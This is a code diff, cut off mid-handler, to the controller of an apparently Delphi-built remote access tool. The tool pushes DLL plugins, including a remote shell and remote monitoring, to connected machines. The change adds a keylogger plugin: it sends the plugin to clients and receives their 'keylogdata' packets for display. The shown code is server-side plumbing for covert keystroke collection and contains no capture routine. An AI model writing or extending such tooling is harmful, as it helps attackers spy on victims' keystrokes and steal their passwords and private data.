@@ -11,13 +11,15 @@ uses
   UnitGetInformation,
   UnitProcessManager,
   UnitRemoteShell,
-  UnitRemoteMonitoring;
+  UnitRemoteMonitoring,
+  UnitKeylogger;
 
 const
   INFORMATION_PLUGIN_ID       = 'InformationPlugin';
   PROCESS_MANAGER_PLUGIN_ID   = 'ProcessManagerPlugin';
   REMOTE_SHELL_PLUGIN_ID      = 'RemoteShellPlugin';
   REMOTE_MONITORING_PLUGIN_ID = 'RemoteMonitoringPlugin';
+  KEYLOGGER_PLUGIN_ID         = 'KeyloggerPlugin';
   MAX_JSON_BUFFER_SIZE        = 16 * 1024 * 1024;
   PACKET_TYPE_JSON            = $01;
   PACKET_TYPE_DLL             = $02;
@@ -64,6 +66,7 @@ type
   TProcessReceivedEvent     = procedure(aLine: TncLine; JSONObj: TJSONObject) of object;
   TRemoteShellReceivedEvent = procedure(aLine: TncLine; JSONObj: TJSONObject) of object;
   TMonitoringReceivedEvent  = procedure(aLine: TncLine; JSONObj: TJSONObject) of object;
+  TKeyloggerReceivedEvent   = procedure(aLine: TncLine; JSONObj: TJSONObject) of object;
   TLogEvent                 = procedure(Category: TLogCategory; const Msg: string) of object;
 
   TServerManager = class
@@ -75,6 +78,7 @@ type
     FProcessForms     : TDictionary<TncLine, TForm4>;
     FRemoteShellForms : TDictionary<TncLine, TForm5>;
     FMonitoringForms  : TDictionary<TncLine, TForm6>;
+    FKeyloggerForms   : TDictionary<TncLine, TForm7>;
     FReadBuffers      : TDictionary<TncLine, TBytes>;
     FHeartbeatTimer   : TTimer;
 
@@ -85,6 +89,7 @@ type
     FOnProcessReceived    : TProcessReceivedEvent;
     FOnRemoteShellReceived: TRemoteShellReceivedEvent;
     FOnMonitoringReceived : TMonitoringReceivedEvent;
+    FOnKeyloggerReceived  : TKeyloggerReceivedEvent;
     FOnLog                : TLogEvent;
 
     procedure OnConnected   (Sender: TObject; aLine: TncLine);
@@ -101,6 +106,7 @@ type
     procedure DetachProcessForms;
     procedure DetachRemoteShellForms;
     procedure DetachMonitoringForms;
+    procedure DetachKeyloggerForms;
 
   public
     constructor Create(aServer: TncTCPServer);
@@ -114,6 +120,7 @@ type
     procedure SendProcessManagerPlugin(aLine: TncLine);
     procedure SendRemoteShellPlugin(aLine: TncLine);
     procedure SendRemoteMonitoringPlugin(aLine: TncLine);
+    procedure SendKeyloggerPlugin(aLine: TncLine);
 
     function  TryGetClientInfo(aLine: TncLine; out Info: TClientInfo): Boolean;
     function  IsActive   : Boolean;
@@ -135,6 +142,10 @@ type
     procedure UnregisterMonitoringForm(aLine: TncLine);
     function  GetMonitoringForm       (aLine: TncLine): TForm6;
 
+    procedure RegisterKeyloggerForm  (aLine: TncLine; AForm: TForm7);
+    procedure UnregisterKeyloggerForm(aLine: TncLine);
+    function  GetKeyloggerForm       (aLine: TncLine): TForm7;
+
     property OnClientConnected    : TClientEvent              read FOnClientConnected     write FOnClientConnected;
     property OnClientUpdated      : TClientEvent              read FOnClientUpdated       write FOnClientUpdated;
     property OnClientDisconnected : TClientRemoveEvent        read FOnClientDisconnected  write FOnClientDisconnected;
@@ -142,6 +153,7 @@ type
     property OnProcessReceived    : TProcessReceivedEvent     read FOnProcessReceived     write FOnProcessReceived;
     property OnRemoteShellReceived: TRemoteShellReceivedEvent read FOnRemoteShellReceived write FOnRemoteShellReceived;
     property OnMonitoringReceived : TMonitoringReceivedEvent  read FOnMonitoringReceived  write FOnMonitoringReceived;
+    property OnKeyloggerReceived  : TKeyloggerReceivedEvent   read FOnKeyloggerReceived   write FOnKeyloggerReceived;
     property OnLog                : TLogEvent                 read FOnLog                 write FOnLog;
   end;
 
@@ -189,6 +201,7 @@ begin
   FProcessForms     := TDictionary<TncLine, TForm4>.Create;
   FRemoteShellForms := TDictionary<TncLine, TForm5>.Create;
   FMonitoringForms  := TDictionary<TncLine, TForm6>.Create;
+  FKeyloggerForms   := TDictionary<TncLine, TForm7>.Create;
   FReadBuffers      := TDictionary<TncLine, TBytes>.Create;
 
   FServer.OnConnected    := OnConnected;
@@ -209,7 +222,9 @@ begin
   DetachProcessForms;
   DetachRemoteShellForms;
   DetachMonitoringForms;
+  DetachKeyloggerForms;
   FReadBuffers.Free;
+  FKeyloggerForms.Free;
   FMonitoringForms.Free;
   FRemoteShellForms.Free;
   FProcessForms.Free;
@@ -396,6 +411,41 @@ begin
   end;
 end;
 
+procedure TServerManager.RegisterKeyloggerForm(aLine: TncLine; AForm: TForm7);
+begin
+  FLock.Enter;
+  try
+    FKeyloggerForms.AddOrSetValue(aLine, AForm);
+  finally
+    FLock.Leave;
+  end;
+end;
+
+procedure TServerManager.UnregisterKeyloggerForm(aLine: TncLine);
+var
+  AForm: TForm7;
+begin
+  FLock.Enter;
+  try
+    if FKeyloggerForms.TryGetValue(aLine, AForm) and Assigned(AForm) then
+      AForm.DetachCallbacks;
+    FKeyloggerForms.Remove(aLine);
+  finally
+    FLock.Leave;
+  end;
+end;
+
+function TServerManager.GetKeyloggerForm(aLine: TncLine): TForm7;
+begin
+  FLock.Enter;
+  try
+    if not FKeyloggerForms.TryGetValue(aLine, Result) then
+      Result := nil;
+  finally
+    FLock.Leave;
+  end;
+end;
+
 procedure TServerManager.DetachProcessForms;
 var
   AForm: TForm4;
@@ -436,6 +486,21 @@ begin
       if Assigned(AForm) then
         AForm.DetachCallbacks;
     FMonitoringForms.Clear;
+  finally
+    FLock.Leave;
+  end;
+end;
+
+procedure TServerManager.DetachKeyloggerForms;
+var
+  AForm: TForm7;
+begin
+  FLock.Enter;
+  try
+    for AForm in FKeyloggerForms.Values do
+      if Assigned(AForm) then
+        AForm.DetachCallbacks;
+    FKeyloggerForms.Clear;
   finally
     FLock.Leave;
   end;
@@ -620,6 +685,11 @@ begin
   SendPlugin(aLine, REMOTE_MONITORING_PLUGIN_ID);
 end;
 
+procedure TServerManager.SendKeyloggerPlugin(aLine: TncLine);
+begin
+  SendPlugin(aLine, KEYLOGGER_PLUGIN_ID);
+end;
+
 { --- Server Olaylari --- }
 
 procedure TServerManager.OnConnected(Sender: TObject; aLine: TncLine);
@@ -663,6 +733,7 @@ var
   ProcessForm     : TForm4;
   RemoteShellForm : TForm5;
   MonitoringForm  : TForm6;
+  KeyloggerForm   : TForm7;
 begin
   IP := aLine.PeerIP;
   FLock.Enter;
@@ -681,6 +752,9 @@ begin
     if FMonitoringForms.TryGetValue(aLine, MonitoringForm) and Assigned(MonitoringForm) then
       MonitoringForm.DetachCallbacks;
     FMonitoringForms.Remove(aLine);
+    if FKeyloggerForms.TryGetValue(aLine, KeyloggerForm) and Assigned(KeyloggerForm) then
+      KeyloggerForm.DetachCallbacks;
+    FKeyloggerForms.Remove(aLine);
   finally
     FLock.Leave;
   end;
@@ -891,6 +965,8 @@ begin
             Self_.SendRemoteShellPlugin(CapturedLine)
           else if SameText(CapturedPluginID, REMOTE_MONITORING_PLUGIN_ID) then
             Self_.SendRemoteMonitoringPlugin(CapturedLine)
+          else if SameText(CapturedPluginID, KEYLOGGER_PLUGIN_ID) then
+            Self_.SendKeyloggerPlugin(CapturedLine)
           else
             Self_.SendPlugin(CapturedLine, CapturedPluginID);
         end).Start;
@@ -969,6 +1045,26 @@ begin
         var JSONClone    := TJSONObject(JSONObj.Clone);
         var CapturedLine := aLine;
         var CB           := FOnMonitoringReceived;
+        QueueToUI(procedure
+        begin
+          try
+            CB(CapturedLine, JSONClone);
+          finally
+            JSONClone.Free;
+          end;
+        end);
+      end;
+      Exit;
+    end;
+
+    if (Action = 'keylogdata') then
+    begin
+      DoLog(lcCommand, '"' + Action + '" received from ' + IP);
+      if Assigned(FOnKeyloggerReceived) then
+      begin
+        var JSONClone    := TJSONObject(JSONObj.Clone);
+        var CapturedLine := aLine;
+        var CB           := FOnKeyloggerReceived;
         QueueToUI(procedure
         begin
           try
